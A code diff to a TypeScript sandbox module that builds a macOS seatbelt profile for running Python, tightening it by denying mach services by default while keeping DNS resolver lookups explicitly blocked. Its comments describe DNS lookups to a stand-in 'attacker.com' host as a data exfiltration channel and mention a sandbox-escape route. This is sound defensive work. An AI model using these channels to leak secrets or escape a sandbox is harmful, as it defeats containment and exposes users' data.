@@ -6,7 +6,7 @@ import { existsSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { startEgressProxy } from "./egressProxy";
 import { ALLOW_HOSTS, buildScript } from "./wheels";
-import { fontsDir, mplConfigDir } from "./runtime";
+import { mplConfigDir, sandboxFontDir } from "./runtime";
 import { winJailCmd, winJailExe } from "./winJail";
 import { ambientSecretDirs, ambientSecretFiles } from "../security/ambientSecrets"; import { BRAND } from "@openmasq/branding";
 import { devOnly } from "../security/devOnly";
@@ -137,9 +137,9 @@ export function seatbeltProfile(scratch: string, proxyPort: number): string {
     "(allow file-write-data (subpath \"/dev\"))",
     // Egress: ONLY the loopback proxy port, or — in max-hardening mode — nothing.
     ...(noNetwork() ? [] : [`(allow network-outbound (remote ip "localhost:${proxyPort}"))`]),
-    "(allow mach-lookup)",
-    // …but NOT the DNS resolver: `getaddrinfo("<secret>.attacker.com")` is an exfil channel
-    // the network-outbound rule can't see. The egress proxy resolves the host itself.
+    // NO mach service (deny default): Python needs none, and one can launch a process OUTSIDE
+    // the jail (`sandboxProfile.test.ts`, python/CLAUDE.md). DNS stays denied explicitly: a
+    // lookup is exfil the network rule can't see; the egress proxy resolves itself.
     '(deny mach-lookup (global-name "com.apple.mDNSResponder"))',
     '(deny mach-lookup (global-name "com.apple.mDNSResponderHelper"))',
     '(deny mach-lookup (global-name "com.apple.dnssd.service"))',
@@ -390,7 +390,7 @@ export async function runPython(
     HOME: scratch,
     ...sandboxTempEnv(tmpDir),
     OPENMASQ_FIG_DIR: figDir,
-    OPENMASQ_FONT_DIR: fontsDir(),
+    OPENMASQ_FONT_DIR: sandboxFontDir(),
     MPLBACKEND: "Agg",
     MPLCONFIGDIR: mplDir,
     PYTHONDONTWRITEBYTECODE: "1",
